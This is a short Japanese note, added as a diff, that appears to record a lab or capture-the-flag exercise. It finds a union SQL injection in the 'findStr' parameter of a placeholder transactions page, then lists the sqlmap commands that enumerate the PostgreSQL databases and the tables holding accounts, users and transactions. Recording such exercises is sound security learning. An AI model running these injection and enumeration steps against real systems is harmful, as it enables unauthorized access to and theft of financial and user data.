@@ -1,0 +1,18 @@
+pythonをインストール
+sqlmapをインストール
+
+http://aaaaaa/transactions.php?findStr=ATMでSQLi union
+
+
+python sqlmap.py -r test.req --dbs
+でPostgresqlとpublicというデータベースを把握
+
+
+python sqlmap.py -r test.req -D public --tables
+で
+accounts
+address_change_requests
+transactions
+user_profile
+users
+というテーブルを取得
